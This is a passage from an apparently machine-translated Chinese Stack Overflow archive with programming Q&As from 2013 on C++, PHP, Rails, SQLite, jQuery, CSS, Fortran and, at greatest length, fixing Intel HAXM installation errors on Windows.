至于问题，这两个方法定义是重载，调用哪一个要看上下文。例如，如果调用者也在一个`const`方法中，并且在它的一个成员上进行调用（谁是具有`data()`方法的类的实例化），那么该`const char * data() const`方法将被调用，调用者只能保存返回值在类型的变量中`const char *`。这是一个例子：

```
class MyClass {
  DataClass data_obj_;   // has both 'data()' methods described in your question
...
  void my_method () const {  // within this const method, data_obj_ cannot be modified
    const char * data = data_obj_.data();  // calls const method
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:50:12.403

这是一个您需要两者的示例。

```
class foo {
    char* data_;
public:
    const char* data() const
    {
        return data_;
    }

    char* data()
    {
        return data_;
    }
};

const foo bar;
foo bar2;
bar->data();  // this uses the const version.
bar2->data(); // this uses the non-const version. 
```

因为`bar`是一个对象，所以调用非常量版本`const`是错误的。`data()``

# php - 如何验证数据库中的记录

> ID：16091653
> 
> 赞同：0
> 
> 时间：2013-04-18T19:39:32.787
> 
> 标签：php

我要做的是检查数据库中是否存在客户 ID。如果存在，则将订单提交到订单表。如果 customerid 不存在，则返回错误。

试图检查customers表，看看用户输入的customerid是否存在，只是不知道怎么做。下面的代码我来自不同的线程。

```
$checkid = "SELECT customerid FROM $tableName WHERE customerid = ".($customerid)."";
$check_ref = @mysql_query($check2,$connection) 
    or die("Couldn't execute check.<br>".mysql_error());
if(mysql_num_rows($check_ref)<1){
    $login_err = "The Customer number you entered does not exist.";
    $error = "1"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:41:54.640

好的，这里开始：

1.  您的查询存储在 中`$checkid`，但您查询`$check2`
2.  您禁用错误报告`mysql_query`。这在很多层面上都是错误的。
3.  那些括号`$customerid`在字符串连接中做什么？

# vb.net - COM 错误 Visual Studio 2010

> ID：16091654
> 
> 赞同：0
> 
> 时间：2013-04-18T19:39:32.750
> 
> 标签：vb.net, com-interop, autocad

最近我一直在研究与 AutoCAD 通信的外部 .exe。因为它是一个外部的.EXE，所以我必须使用 COM 来获得我想要的东西。（否则我本可以使用（在我看来）更好的 .NET API）。

无论如何，我不断收到 COM 互操作错误（**Call 被 Callee 拒绝**），我在处理它时遇到了很多麻烦。我可以使用计时器，但有时它会过度等待或等待特定情况。此外，如果我必须使用速度较慢的计算机，这不是最好的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:39:32.750

微软的解决方案：

1.  将以下类添加到您的应用程序中。
2.  添加对“Microsoft Development Environment 8.0”的引用。这会将对 EnvDTE 和 EnvDTE80 的引用添加到您的解决方案中。

    添加对 System.Windows.Forms 的引用。

3.  在代码中，创建一个 EnvDTE80 实例，如下例中所述。
4.  调用 Message.Register 来处理线程错误。
5.  像往常一样调用您的自动化代码。
6.  当您的自动化代码完成后，调用 Message.Revoke 以删除线程错误处理程序。

[http://msdn.microsoft.com/en-us/library/vstudio/ms228772(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/vstudio/ms228772(v=vs.100).aspx)

**输入**

为了使用错误管理代码（一旦添加了类），我们需要添加一个导入，例如：

```
Imports WindowsApplication1.ConsoleApplication2 
```

# orchardcms - 果园丢失密码电子邮件模板

> ID：16091661
> 
> 赞同：0
> 
> 时间：2013-04-18T19:39:59.557
> 
> 标签：orchardcms, password-recovery, email-templates

我正在尝试编辑果园丢失密码功能的电子邮件模板。我可以找到生成默认模板的视图，但是当我更改它时没有任何反应，因为据我所知，它是在 dll 中编译的。有没有办法改变它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T05:27:25.760

不确定您指的是什么视图：如果不更改 Orchard.Users.Handlers.UserMessageAlteration.Sending，则当前无法更改消息，除非您将其替换为您自己的实现并从那里更改消息。

# ruby-on-rails-3 - 传递“Accept：none”HTTP 标头时，Rails 3 应用程序抛出错误

> ID：16091662
> 
> 赞同：1
> 
> 时间：2013-04-18T19:40:02.730
> 
> 标签：ruby-on-rails-3, http-headers, mime-types

`Accept: None`当某些浏览器请求我们的网站但指定了HTTP 标头（主要是移动设备，看起来像）时，我们已经看到 Airbrake 异常。经过大量研究，似乎大多数面向消费者的应用程序只是忽略 Accept HTTP 标头并发送 HTML，我们之前通过将其添加到我们的`mime_types.rb`文件中来解决此问题

```
Mime::Type.register "none", :html 
```

但后来我们的电子邮件开始以纯文本形式发送，我相信因为我们正在重新定义`text/html`应该如何工作。是否有更好的解决方法，以便在有人发送`Accept: None`标头时我们仍然发送 HTML？

编辑：我忘了说，这是我跑步时得到`rails c`的，我想知道我是否正在重新定义 HTML。

```
$ rails c
/1.9.3-p194/lib/ruby/gems/1.9.1/gems/actionpack-3.2.12/lib/action_dispatch/http/mime_type.rb:102: warning: already initialized constant HTML 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T19:17:55.127

另一个解决方法是将以下内容添加`before_filter`到您的`ApplicationController`

```
def fix_accept_headers_for_none
  if request.formats.include?("none")
    request.format = :html
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T22:23:03.147

尝试

```
Mime::Type.register "text/html", :html, %w(none) 
```

添加`"none"`为`mime_type_synonym`_`html`

[http://api.rubyonrails.org/classes/Mime/Type.html#method-c-register](http://api.rubyonrails.org/classes/Mime/Type.html#method-c-register)

# android - 未创建外键语法错误表

> ID：16091665
> 
> 赞同：0
> 
> 时间：2013-04-18T19:40:16.650
> 
> 标签：android, sqlite, foreign-keys

由于 FOREIGN KEY 语法错误，我的表没有被创建，但我似乎无法弄清楚。在调用 FK 之前，我确保首先创建了 int。这是我的 FK 课程的代码

```
public class PlayerStatsDatabase  {
public static final String KEY_ROWID = "_id";
public static final String PLAYER_ID = "PlayerId";
 public static final String KEY_SCORE = "Goals_Scored";
 public static final String KEY_MINUTES = "Minutes_Played";
 public static final String KEY_SUBIN = "Substitute_In";
 public static final String KEY_SUBOUT = "Substitute_Out";
 public static final String KEY_BOOKING = "Booked";

 private static final String TAG = "PlayersStatsDatabase";
 private DatabaseHelper mDbHelper;
 private SQLiteDatabase mDb;

 private static final String DATABASE_NAME = "Players";
 private static final String SQLITE_TABLE = "PlayerStats";
 private static final int DATABASE_VERSION = 2;

 private final Context mCtx;

 private static final String DATABASE_CREATE =
  "CREATE TABLE if not exists " + SQLITE_TABLE + " (" +
  KEY_ROWID + " integer PRIMARY KEY autoincrement," +
  PLAYER_ID + "integer"+" FOREIGN KEY ("+PLAYER_ID+") REFERENCES "+DATABASE_NAME+" ("+KEY_ROWID+"),"+
  KEY_SCORE + "," +
  KEY_MINUTES + "," +
  KEY_SUBIN + "," +
  KEY_SUBOUT + "," +
  KEY_BOOKING + ")" ; 
```

主键在这个类中

```
public class PlayerDbAdapter {

private static final String DATABASE_TABLE = "Players";
private static final String DATABASE_CREATE = "CREATE TABLE "+DATABASE_TABLE+" (_id integer primary key autoincrement, Player_Name text not null, Player_Position text not null, Player_Number text not null, Team text not null);";
private static final int DATABASE_VERSION =1;
  public static final String KEY_BODY = "Player_Name";
  public static final String KEY_ROWID = "_id";
  public static final String KEY_TITLE = "Player_Position";
  public static final String KEY_NUMBER = "Player_Number";
  public static final String KEY_TEAM = "Team";
private static final String TAG = "PlayerDbAdapter";
  private final Context mCtx;
  private SQLiteDatabase mDb;
  private DatabaseHelper mDbHelper;

  public PlayerDbAdapter(Context paramContext)
  {
    this.mCtx = paramContext;
  }

  public void close()
  {
    this.mDbHelper.close();
  }

  public long createPlayers(String playerName, String playerPosition, String playerNumber, String team)
  {
    ContentValues localContentValues = new ContentValues();
    localContentValues.put(KEY_BODY, playerName);
    localContentValues.put(KEY_TITLE, playerPosition);
    localContentValues.put(KEY_NUMBER, playerNumber);
    localContentValues.put(KEY_TEAM, team);
    try{
        return this.mDb.insert("Players", null, localContentValues);
    } catch (Exception e) {
        Log.e("Juma", e.getMessage());
    }

    return 0;
  } 
```

日志猫

`04-18 19:28:08.544: E/Database(352): Failure 1 (near "FOREIGN": syntax error) on 0x2b5840 when preparing 'CREATE TABLE if not exists PlayerStats (_id integer PRIMARY KEY autoincrement,PlayerIdinteger FOREIGN KEY (PlayerId) REFERENCES Players (_id),Goals_Scored,Minutes_Played,Substitute_In,Substitute_Out,Booked)'.`

是因为我没有在 oNCreate 方法上插入 Player_id 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:09:24.713

这是我从[SQLite 文档](http://www.sqlite.org/foreignkeys.html)中获取的修改示例：

```
CREATE TABLE track(
  KEY_ROWID   INTEGER PRIMARY KEY autoincrement, 
  PLAYER_ID   INTEGER, 
  KEY_SCORE   TEXT,
  FOREIGN KEY(PLAYER_ID) REFERENCES anotherTable(THE_KEY_ROWID_HERE),
  FOREIGN KEY(KEY_ROWID, PLAYER_ID) 
          REFERENCES yetAnotherTable(THE_KEY_ROWID_THERE, THE_PLAYER_ID_THERE)
); 
```

如您所见，您必须在所有列定义*之后*添加外键- 不要尝试将它们*放在*列定义中。您可以拥有多个，也可以拥有带有组合列的外键。

最后，在构建 SQL 字符串时要小心，您的语句：

```
CREATE TABLE if not exists PlayerStats (
 _id        integer PRIMARY KEY autoincrement,
  PlayerId  integer,
  Goals_Scored,
  Minutes_Played,
  ... 
```

...缺少某些列的类型。

**ps**：这个应该可以工作，例如

```
private static final String TABLE_CREATE =
  "CREATE TABLE if not exists " + TABLE_NAME + " (" +
    KEY_ROWID      + " integer PRIMARY KEY autoincrement,"
    ANOTHER_COLUMN + " text" +")";

 private static final String SQLITE_CREATE =
  "CREATE TABLE if not exists " + SQLITE_TABLE + " (" +
    KEY_ROWID   + " integer PRIMARY KEY autoincrement," +
    PLAYER_ID   + " integer,"
    KEY_SCORE   + " text," +
    KEY_MINUTES + " text," +
    KEY_SUBIN   + " text," +
    KEY_SUBOUT  + " text," +
    KEY_BOOKING + " text,"
    +" FOREIGN KEY("+PLAYER_ID+") REFERENCES "+TABLE_NAME+" ("+KEY_ROWID+"))"; 
```

希望我能帮上一点忙。

干杯!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:10:42.033

根据日志，您在“FOREIGN”附近有一个语法错误，很明显“PlayerId”和“integer”之间没有空格，除了整数后面的逗号。此外，您没有提交 [Goals_Scored,Minutes_Played,Substitute_In,Substitute_Out,Booked] 的类型。

我建议学习更多关于 SQL 查询的知识，你可以从在桌面上使用 sqlite 开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:57:38.133

您必须在 android sqlite 中将主键的名称命名为 _id。

# google-app-engine - 将字符串分配为 Google App Engine 实体键

> ID：16091670
> 
> 赞同：0
> 
> 时间：2013-04-18T19:40:27.027
> 
> 标签：google-app-engine, jpa, primary-key

我搜索了很多。我仍然无法理解如何将字符串分配给**Google App Engine**实体类 id(Key)。

所以我有：

```
Key id; 
```

和

```
setId(String id) { 
    // I know that here I can use id = KeyFactory.createKey("",""); 
} 
```

但我不知道如何在`createKey`这里使用方法将我的字符串分配给 id。请将此处的用户视为我的`Entity`班级名称。

PS我正在使用**JPA**。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:35:39.427

不确定您的实体是否正在寻找，但这对我来说效果很好。，

```
@Entity
class Person{
    @Id String personId; 
    String firstName;
} 
```

# php - jquery：appendTo在隐藏字段中丢失stripslashes

> ID：16091673
> 
> 赞同：0
> 
> 时间：2013-04-18T19:40:35.167
> 
> 标签：php, jquery, regex, dom, appendto

正在开发一个使用 PHP 和 jQuery 创建表单的前端实用程序；我可以添加几个特定字段，稍后将在表单上使用这些字段，哪些参数存储在图形界面的动态插入隐藏字段中。到目前为止一切正常，但我偶然发现了将字段添加到显示的代码的问题（后来被解析以生成最终的表单数据）；在包含参数的注入 DIV 中，存储在隐藏字段中的正则表达式的反斜杠被删除。以下是部分代码：

```
var fieldsNumber =1; //this determines the field id of the inserted feature
fieldCenterHtml =   '<div class="formFieldCenterArea">'
        +   '<div class="formParamContainer"><label>Default value:</label><input type="text" name="field_'+fieldsNumber+'_value" value=""/></div>' 
            +   '<input type="hidden" name="field_'+fieldsNumber+'_type" value="phone_number"/>'
        +   '<input type="hidden" name="field_'+fieldsNumber+'_firstValue" value=""/>'
        +   '<input type="hidden" name="field_'+fieldsNumber+'_valueList" value=""/>'
        +   '<input type="hidden" name="field_'+fieldsNumber+'_hasRegex" value="1"/>'
        +   '<input type="hidden" name="field_'+fieldsNumber+'_regex" value="/^[(]?\d{3}[)]?\s?-?\s?\d{3}\s?-?\s?\d{4}$/"/>' 
        +   '<input type="hidden" name="field_'+fieldsNumber+'_hasSize" value="0"/>'
        +   '<input type="hidden" name="field_'+fieldsNumber+'_size" value="0"/>'
    +   '<div class="formParamContainer"><label>is Required:</label><input type="checkbox" name="field_'+fieldsNumber+'_isRequired"  value="1" /></div>';
        +   '</div> <!-- end formCenterField --'+'>';

//the injecting code

fieldDataHtml = fieldCenterHtml;

    //insert the field in the DOM

        var element = $('<div/>', {
        class: 'element',
        html: fieldDataHtml
    }).appendTo('#form-area-container'); 
```

当该字段插入页面时，field_1_regex 如下所示：

```
<input type="hidden" value="/^[(]?d{3}[)]?s?-?s?d{3}s?-?s?d{4}$/" name="field_1_regex"> 
```

并丢失正则表达式中的所有反斜杠。我怀疑 appendTo 在 DOM 中插入时剥离了反​​斜杠；我该如何解决这个问题？

一个 [工作示例](http://jsfiddle.net/aANNs/3/)在 jsFiddle 上。

[编辑] 解决了；我决定预测正则表达式字段的人口推空字段，并在使用 jquery 插入 DOM 后插入该值。

jsFiddle 中的解决方案测试在[这里](http://jsfiddle.net/aANNs/3/)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:26:48.463

这可能是因为反斜杠应该在这样的字符串中转义：

```
'_regex" value="/^[(]?\\d{3}[)]?\\s?-?\\s?\\d{3}\\s?-?\\s?\\d{4}$/"/>' 
```

# css - 本地背景图片未加载

> ID：16091674
> 
> 赞同：0
> 
> 时间：2013-04-18T19:40:36.147
> 
> 标签：css, image, background, local

这看起来很简单，但由于某种原因无法正常工作。我在 css 中有一个背景图像（本地），如下所示：

```
#header { background-image: url('/../img/students.jpg'); }
/*also tried this */ #header { background-image: url('../img/students.jpg'); } 
```

但它不会加载。这是目录结构：

```
---css
-------styles.css
---img
-------students.jpg 
```

有什么我想念的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T10:43:38.153

这**应该**有效。

```
#header { 
    background-image: url('../img/students.jpg'); 
} 
```

此外，这也应该有效

```
#header { 
    background-image: url('/img/students.jpg'); 
} 
```

我的猜测是您遇到了一些缓存问题。您的第一次尝试是错误`/../img/students.jpg`的，比文档根目录高一级，这是不可能的。您的浏览器可能已缓存了带有此错误的 css，一旦您使用上述解决方案之一修复了 css 文件，请尝试多次按 CTRL + F5（或完全清除浏览器的缓存）。

# android-emulator - Intel HAXM 安装错误 - 此计算机不支持 Intel 虚拟化技术 (VT-x)

> ID：16091677
> 
> 赞同：143
> 
> 时间：2013-04-18T19:40:45.553
> 
> 标签：android-emulator, intel, haxm

我的 HAXM 安装有问题。事情就是这样。每次尝试为我的计算机安装 HAXM 时，我都会收到此错误： ![安装错误打印屏幕](https://i.stack.imgur.com/IRJU3.png)

问题是，我的电脑支持虚拟化技术（见下图）。知道如何解决这个问题吗？ ![在此处输入图像描述](https://i.stack.imgur.com/yW2H5.png)

* * *

## 回答 #1

> 赞同：155
> 
> 时间：2015-01-08T11:41:42.390

只需遵循以下步骤：

1.  转到*控制面板 → 程序和功能*。
2.  单击*打开和关闭窗口功能*。一个窗口打开。
3.  取消选中*Hyper-V*和*Windows Hypervisor Platform*选项并重新启动系统。

现在，您可以开始 HAXM 安装而不会出现任何错误。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2018-12-07T20:03:54.330

似乎修复列表正在增长，即使是在最初的问题发生多年之后。

以下是 Windows 的较为全面的列表（截至 2022 年 1 月左右）

* * *

**如果您有 Windows 10，安装了所有更新并且您相信**

*   Hyper-V 已禁用
*   Microsoft Defender 的内存完整性/核心隔离已禁用
*   杀毒软件被禁用

**尝试下面的*第 6 步*。这很可能是原因。**

此外，要查看您的修复是否有效，您可以[在此处手动下载英特尔 HAXM 安装程序](https://github.com/intel/haxm/releases/latest)。（最新版本的 HAXM 可能与来自 Android Studio 的版本不同）在开始安装之前，请从命令行运行`haxm_check.exe`下载中包含的内容。如果您的修复有效，它应该`yes`同时显示`NX`和`VT`。

如果你只是双击`haxm_check.exe`你什么都看不到。从 cmd 或 powershell 运行它以查看输出。

* * *

1.  **检查 BIOS**

*   进入 BIOS/UEFI 设置并查找类似的设置
    *   VT-x
    *   VT-d
    *   虚拟化技术
    *   硬件虚拟化

确保它是**Enabled**。如果该选项不存在，请咨询您的制造商和型号以确保它受支持。

2.  **禁用 Hyper-V**

*   在开始菜单中输入“Windows 功能”，选择“打开或关闭 Windows 功能”。
*   取消选择所有与 Hyper-V 相关的选项，按 OK，重新启动。
*   这将破坏您拥有的任何 Hyper-V 虚拟机，包括任何 Windows Phone 模拟器以及您设置的任何其他需要 Hyper-V 的设备
*   需要重启
*   在管理员命令提示符下，运行`systeminfo`. 如果它在 Hyper-V 要求下显示“检测到管理程序”，即使在删除 Hyper-V 功能之后，您也可能启用了“核心隔离”。请参阅下文，了解如何禁用它。
*   作为另一种选择，如果您仍需要 Hyper-V 支持，请尝试启用“ **Windows Hypervisor Platform ”。**[更多信息在这里](https://blogs.msdn.microsoft.com/visualstudio/2018/05/08/hyper-v-android-emulator-support/)

3.  **AMD锐龙？**

*   如果您的 CPU 是 AMD Ryzen，您可能需要**启用**“ *Windows Hypervisor Platform* ”功能，就像您在上面禁用 Hyper-V 一样。
*   如果它已启用但仍然无法正常工作，请尝试禁用它。¯\ *(ツ)* /¯
*   需要重启

4.  **禁用防病毒软件**

*   尝试禁用您的防病毒软件。
*   阿瓦斯特！和其他一些干扰虚拟化的检测。您可以在之后启用它们。
*   AVAST 和其他一些也有一些使用基于虚拟化的隔离的选项。禁用它们或暂时卸载您的 AV。

5.  **禁用核心隔离**

*   Windows 10 1803 的全新安装默认启用核心隔离，它在虚拟化容器内运行安全进程以确保安全。这会干扰虚拟化的检测。
*   从早期版本升级的机器已禁用此功能，但无论如何都要检查。
*   转到 Windows Defender 安全中心
*   设备安全 > 核心隔离 > 详细信息
*   **禁用**内存完整性
*   重启

* * *

6.  **在引导时禁用管理程序启动**

*   在管理员命令提示符下，运行`bcdedit /set hypervisorlaunchtype off`
*   重启
*   恢复运行`bcdedit /set hypervisorlaunchtype auto`并重新启动
*   您可以`auto`在安装模拟器后将其设置为。`off`但是下次创建模拟器/下载并安装模拟器映像时可能需要设置为重新启动。

* * *

7.  **卸载 Docker 桌面**

*   一些用户报告说卸载 Docker Desktop 解决了他们的问题。
*   目前还不清楚为什么 docker desktop 会干扰 haxm 安装。原因可能是它支持通过 Hyper-V 后端运行 docker 映像，并且禁用此功能不会完全删除虚拟机管理程序。
*   转到设置-> 添加或删除程序，然后卸载 docker desktop
*   需要重启

* * *

8.  **没有任何效果**

*   你不应该到这里，因为如果你启用了“Windows Hypervisor Platform”，Android 模拟器现在可以与 Hyper-V 一起运行。
*   如果以上都不起作用，作为最后的手段，您可以尝试[在 Hyper-V](http://techgenix.com/running-an-android-emulator-on-hyper-v/)虚拟机中运行 Android 并让 ADB 连接到它。（不是解决方案，而是解决方法）
*   [您还可以使用Genimotion](https://www.genymotion.com/)等第三方模拟器运行 android 。

* * *

9.  **¯\ *(ツ)* /¯**

*   [在物理设备上调试](https://developer.android.com/studio/run/device)

欢迎编辑/新修复。

希望这可以帮助

* * *

## 回答 #3

> 赞同：30
> 
> 时间：2013-09-13T23:33:39.860

对不起，我忘记回答这个问题了。经过几天的谷歌搜索，我发现这个问题是由超线程（或 hyper-v）引起的。我决定编辑我的 boot.ini 文件，并选择在关闭超线程的情况下启动 Windows。我按照[本教程](http://blogs.msdn.com/b/virtual_pc_guy/archive/2008/04/14/creating-a-no-hypervisor-boot-entry.aspx)进行操作，现在一切正常

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2013-08-13T10:52:08.717

您是否有安装了 hyper-v 的 Windows 8？如果是，请删除 hyper-v，您的问题就会消失！

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2014-01-01T23:14:23.727

1.  首先确保您在 BIOS 中启用了虚拟化技术。重新启动计算机后，按键盘上的 F1-F12 并找到此选项。

2.  确保您在 Windows 7/Windows 8 中禁用了 Hyper-V。您可以在控制面板 -> 程序 -> Windows 功能中将其关闭

3.  您可以尝试在整个安装过程中禁用防病毒程序。请记住在安装 HAXM 后恢复所有防病毒服务。

4.  有人推荐*冷启动*，即：

    1.  在 BIOS 中禁用虚拟化
    2.  重新启动计算机并将其关闭
    3.  在 BIOS 中启用 VT
    4.  重启电脑，关机
    5.  现在可能允许安装HAXM

不幸的是，这一步对我不起作用

1.  最后但同样重要的是：试试英特尔发布的这个解决方法补丁。

[http://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown](http://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown)

您所要做的就是下载包，解压缩，将其与 HAXM 安装程序文件放在一起，然后运行包中包含的 .cmd 文件 - 请记住，以管理员身份启动它。

我在安装 HAXM 时遇到了很多问题，只有最后一步对我有帮助。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2013-05-02T08:18:52.267

也许您的 BIOS 中未启用 VT-X。

请参阅此处的英特尔 HAXM 文档：http: [//software.intel.com/en-us/articles/installation-instructions-for-intel-hardware-accelerated-execution-manager-windows](http://software.intel.com/en-us/articles/installation-instructions-for-intel-hardware-accelerated-execution-manager-windows)

> **英特尔 VT-x 未启用**
> 
> 在某些情况下，Intel VT-x 可能在系统 BIOS 中被禁用，必须在 BIOS 设置实用程序中启用。要访问 BIOS 设置实用程序，必须在计算机启动过程中按下一个键。此键取决于所使用的 BIOS，但通常是 F2、Delete 或 Esc 键。在 BIOS 设置实用程序中，英特尔 VT 可以通过术语“VT”、“虚拟化技术”或“VT-d”来标识。确保启用所有虚拟化功能。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2018-08-13T06:03:50.863

在“打开或关闭 Windows 功能”窗口中，取消选中 Hyper-V 并确保未选中 Windows Hypervisor Platform。启用的 Windows 虚拟机监控程序平台还可以阻止英特尔 HaxM 的安装

[![要禁用的功能](https://i.stack.imgur.com/yna1P.png)](https://i.stack.imgur.com/yna1P.png)

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2015-01-28T08:26:20.760

防病毒软件可能会干扰 HAXM 安装。在试图找出问题所在几个小时后，我找到了一个奇怪的解决方案 - 卸载我的防病毒软件，安装 HAXM（有效），然后重新安装防病毒软件（在我的情况下是 Avast，但它可能会发生以及其他防病毒程序。

我为使其运行而进行的全面检查是：

1.  检查 BIOS 中的“虚拟化”和 vt-X 功能。
2.  验证 Hyper-V 未安装。
3.  使用 Intel 工具和 MS 工具在 windows 中启用了检查天气 vt-X（在此线程的前几篇文章中提到）。
4.  禁用没有帮助的防病毒软件。
5.  卸载防病毒软件（这解决了我的问题）。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2018-09-18T10:00:01.940

在 Windows 10 中，Windows Defender 具有核心隔离功能，该功能使用虚拟化技术，该技术也会中断 HAXM 的工作。禁用它并重试。就我而言，禁用它解决了我的问题。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2018-12-03T13:14:16.277

如果您的计算机中有 AMD Ryzen 处理器，则需要满足以下设置要求：

1.  AMD 处理器 - 推荐：AMD® Ryzen™ 处理器
2.  Android Studio 3.2 Beta 或更高版本 - 通过 Android Studio 预览页面下载
3.  Android Emulator v27.3.8+ - 通过 Android Studio SDK Manager 下载
4.  x86 Android 虚拟设备 (AVD) - 创建 AVD
5.  带有 2018 年 4 月更新的 Windows 10
6.  通过 Windows 功能启用：“Windows Hypervisor 平台”

**注意：有 Hyper-V 功能...您应该启用 Windows Hypervisor Platform 而不是 Hyper-V。Windows Hypervisor 平台位于底部**

条件完成后 avd x86 无需 haxm install 即可工作

[参考](https://android-developers.googleblog.com/2018/07/android-emulator-amd-processor-hyper-v.html)

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-06-16T01:25:53.147

在许多情况下，某些防病毒软件还会通过窗口启动方式启动 HyperV，并且不允许安装 HAXM。由于 AVAST 防病毒软件，我遇到了这个问题。所以我卸载了 AVAST，然后重新启动后正确安装了 HAXM。然后我重新安装了 AVAST。

因此，即使安装了 AVAST，HAXM 也只是在安装时进行检查，HAXM 可以与虚拟盒和 android 模拟器一起正常工作。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2014-05-16T20:36:37.960

安装 Visual Studio 2013 Update 2 后，Visual Studio 通知我有关我安装的 Windows Phone 模拟器更新（它实际上是一个新组件，而不是更新）。事实证明，这启用了破坏 HAXM 的 Hyper-V。

解决方案是从程序和功能中卸载模拟器并从 Windows 功能中关闭 Hyper-V（搜索“Windows 功能”并单击“打开或关闭 Windows 功能”）。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2016-09-27T09:18:59.987

如果您没有在控制面板中找到 Hyper-V 选项，如其他[回复](https://stackoverflow.com/a/27839301/3214497 "回应")中所述，请尝试进入 BIOS 设置（重新启动并按 F-12 或 ESC 或其他取决于您的 PC）并启用虚拟化，可能位于 CPU 选项中。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-04-26T05:08:09.367

**如果没有一个答案适合你，试试这个，**

可能未禁用 Hyper-V 如果您启用了 Windows 10 功能（例如 Device Guard 和 Credential Guard），则可以防止 Hyper-V 被完全禁用。

微软发布的 Device Guard 和 Credential Guard 硬件准备工具可以禁用上述 Windows 10 功能以及 Hyper-V：

在这里下载，[https://www.microsoft.com/en-us/download/details.aspx?id=53337](https://www.microsoft.com/en-us/download/details.aspx?id=53337)

下载最新版本的 Device Guard 和 Credential Guard 硬件准备工具。解压缩使用以管理员身份运行@powershell -ExecutionPolicy RemoteSigned -Command "X:\path\to\dgreadiness_v3.6\DG_Readiness_Tool_v3.6.ps1 -Disable" 重新启动打开命令提示符。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2020-09-30T07:18:32.530

我已经在 stackoverflow 上尝试了所有可能的解决方案，但没有奏效我尝试了什么：

1.  在 Windows 功能中禁用 Hyper-V
2.  使用命令禁用 Hyper-V
3.  禁用设备保护
4.  等等 上面的解决方案仍然在系统信息中为我提供有关 Hyper-V 的信息，并且 HAXM 仍然无法安装。

但最后我找到了解决方案，你必须**从系统配置中禁用 Hyper-V**：

1.  开放系统配置
2.  单击服务选项卡
3.  取消选中所有与 Hyper-V 相关的

检查系统信息，然后 Hyper-V 现已关闭

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-08-28T12:26:35.803

修复错误。请按照以下步骤操作

1.  关闭 Hyper-V 和 Windows Hypervisor 平台
2.  转到 RegEdit “Windows Defender 正在阻止 HAXM。”
    *   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard
    *   将密钥 EnableVirtualizationBasedSecurity 设置为“0”

**如果密钥不可用，则创建密钥**

3.  重新启动机器
4.  安装 intelhaxm-android.exe

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-03-19T23:38:33.033

如果任何答案都不起作用，只需删除**Android Emulator**并重新安装即可。然后尝试安装**Intel Haxm**。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-01-31T05:21:31.203

我正在运行 Windows 10 并在更换 SSD 后遇到此问题，我通过禁用 Bios 上的 VT 支持来修复它。运行安装程序后出现不同的错误。我重新启动并再次启用了 VT 支持，瞧，现在可以工作了。

# fortran - Compaq Visual Fortran 与 gfortran FORMAT 语句的区别

> ID：16091680
> 
> 赞同：1
> 
> 时间：2013-04-18T19:40:50.997
> 
> 标签：fortran, translate, gfortran, intel-fortran

我有一大段 Fortran 代码，我想用 gfortran 编译该代码。我以前没有使用过 Fortran。我不知道代码的具体规范是什么，但我发现它至少可以用 Compaq Visual Fortran 6.6 编译——所以我猜它是在它下面编写的。

一般的问题是：**有没有自动 Compaq Visual Fortran 到 gfortran 的翻译器？**我没有找到。

事实上，经过一些修复后，代码确实可以使用 gfortran 进行编译，但在运行时出现异常：它没有按预期读取输入文件。这是一个代码示例：

```
CHARACTER*6  VAR1
CHARACTER*1  VAR2
CHARACTER*3  VAR3

OPEN (UNIT=CHANNEL, FILE=FILENAME, STATUS='OLD')
READ(CHANNEL, 38)VAR1,VAR2,VAR3

38 FORMAT(15X,A6,7X,A1,14X,A3) 
```

还有一个数据示例：

```
123456789012345------'1234567-'''''12345678901234---
.ABCDEF.GHI.JKLMNOPQR.STUVWX.YZABC.DEF.GHI.JKLM....P
123456789012345------1234567-12345678901234--- 
```

第一行是原始应用程序如何读取它，第三 - gfortran，第二 - 来自数据文件的行示例（`1`-`9`用于省略字符，`-`用于读取，`'`用于未提及的格式，`.` *在示例中而不是**原始行*中的空格）。

因此，结果将是：

```
Origanal: VAR1 == 'MNOPQR', VAR2 == 'Y', VAR3 == '..P' - correct
gfortran: VAR1 == 'MNOPQR', VAR2 == '.', VAR3 == 'JKL' - wrong 
```

gfortran 非常简单：它跳过 15 个字符，读取 6 个字符，跳过 7 个字符，依此类推。但原来的应用程序是另一种方式，我猜不出它的逻辑。它仍然读取指定数量的字符，但跳得比指定的更远。它确实阅读了预期阅读的内容。

我尝试指定它们出现在输入文件 ( `15X,A6,8X,A1,19X,A3`) 中的确切长度，它适用于 gfortran，但这不是一个长期解决方案。

所以，我更具体的问题是：**gfortran 和 Compaq Visual Fortran 6.6****中的语句有什么不同吗？`FORMAT`**（也许，我的想法是错误的`FORMAT`是原因）

**UPD**

